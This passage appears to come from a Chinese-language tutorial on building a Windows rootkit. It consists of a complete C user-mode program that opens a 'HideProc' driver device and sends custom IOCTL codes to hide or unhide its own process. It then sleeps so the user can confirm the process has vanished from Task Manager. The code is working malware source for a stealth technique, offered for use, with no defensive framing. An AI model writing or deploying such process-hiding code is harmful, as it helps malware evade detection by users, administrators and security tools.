## 4. 用户态触发器

```c
// hide.c  —  cl /nologo hide.c
#include <windows.h>
#include <stdio.h>

#define IOCTL_HP_HIDE   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HP_UNHIDE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

int wmain(int argc, wchar_t **argv)
{
    HANDLE h;
    DWORD  code, ret = 0;
    BOOL   ok;

    h = CreateFileW(L"\\\\.\\HideProc", GENERIC_READ | GENERIC_WRITE,
                    0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        wprintf(L"open failed: %lu\n", GetLastError());
        return 1;
    }

    code = (argc > 1 && !_wcsicmp(argv[1], L"unhide")) ? IOCTL_HP_UNHIDE : IOCTL_HP_HIDE;
    ok   = DeviceIoControl(h, code, NULL, 0, NULL, 0, &ret, NULL);
    wprintf(L"ioctl 0x%X -> %s (err %lu)\n", code, ok ? L"ok" : L"fail", GetLastError());

    if (code == IOCTL_HP_HIDE) {
        wprintf(L"hidden. pid=%lu, sleeping 120s — 打开 Task Manager / tasklist 验证\n",
                GetCurrentProcessId());
        Sleep(120000);
    }
    CloseHandle(h);
    return 0;
}
```

